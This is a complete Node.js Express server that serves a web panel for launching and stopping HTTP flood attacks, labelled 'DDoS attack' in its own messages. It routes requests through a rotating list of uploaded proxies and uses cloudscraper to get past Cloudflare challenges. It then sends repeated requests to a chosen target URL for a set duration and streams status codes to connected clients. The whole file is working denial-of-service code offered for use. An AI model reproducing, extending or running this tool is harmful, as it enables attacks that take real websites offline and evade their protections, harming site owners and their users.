const express = require('express');
const bodyParser = require('body-parser');
const CloudScraper = require('cloudscraper');
const http = require('http');
const WebSocket = require('ws');
const multer = require('multer');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Set up multer for handling file uploads
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

let attackInterval;
let connectedClients = new Set();

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

wss.on('connection', (ws) => {
  console.log('Client connected');
  connectedClients.add(ws);

  ws.on('close', () => {
    console.log('Client disconnected');
    connectedClients.delete(ws);
  });
});

app.post('/start-attack', upload.single('proxy'), async (req, res) => {
  const { url, delay, count, duration } = req.body;
  const proxyFile = req.file; // The uploaded proxy file

  const target = url.trim();
  const attackDelay = parseInt(delay, 10) * 1000; // Convert to milliseconds
  const requestsPerIp = parseInt(count, 10);
  const attackDuration = parseInt(duration, 10) * 1000; // Convert to milliseconds

  let proxies = [];

  // Check if the proxy file is provided
  if (proxyFile) {
    // Convert the buffer data from the uploaded file to string
    proxies = proxyFile.buffer.toString().split('\n').filter(Boolean);
  }

  function sendRequest() {
    let proxy;

    // Use a proxy if available
    if (proxies.length > 0) {
      proxy = proxies[Math.floor(Math.random() * proxies.length)];
    }

    const getHeaders = new Promise((resolve, reject) => {
      CloudScraper({
        uri: target,
        resolveWithFullResponse: true,
        proxy: proxy ? 'http://' + proxy : undefined,
        challengesToSolve: 10
      }, (error, response) => {
        if (error) {
          // Remove the proxy from the list if an error occurs
          if (proxy) {
            const objIndex = proxies.indexOf(proxy);
            proxies.splice(objIndex, 1);
          }

          const errorMessage = 'Error: ' + error.message;
          console.log(errorMessage);
          sendToClients(errorMessage);
        } else {
          resolve(response.request.headers);
        }
      });
    });

    getHeaders.then((result) => {
      for (let i = 0; i < requestsPerIp; ++i) {
        CloudScraper({
          uri: target,
          headers: result,
          proxy: proxy ? 'http://' + proxy : undefined,
          followAllRedirects: false
        }, (error, response) => {
          if (error) {
            const errorMessage = 'Error: ' + error.message;
            console.log(errorMessage);
            sendToClients(errorMessage);
          } else {
            const message = `Request ${i + 1}: Status Code - ${response.statusCode}`;
            console.log(message);
            sendToClients(message);
          }
        });
      }
    });
  }

  attackInterval = setInterval(() => {
    sendRequest();
  }, attackDelay);

  setTimeout(() => {
    clearInterval(attackInterval);
    console.log('Attack ended.');
    sendToClients('DDoS attack ended.');
  }, attackDuration);

  res.send('DDoS attack initiated.');
});

app.post('/stop-attack', (req, res) => {
  clearInterval(attackInterval);
  console.log('Attack stopped.');
  sendToClients('DDoS attack stopped.');
  res.send('DDoS attack stopped.');
});

function sendToClients(message) {
  connectedClients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(message);
    }
  });
}
// Hide unhandled rejection errors in console
  process.on('uncaughtException', function (err) {
    // console.log(err);
  });
  process.on('unhandledRejection', function (err) {
    // console.log(err);
  });

server.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});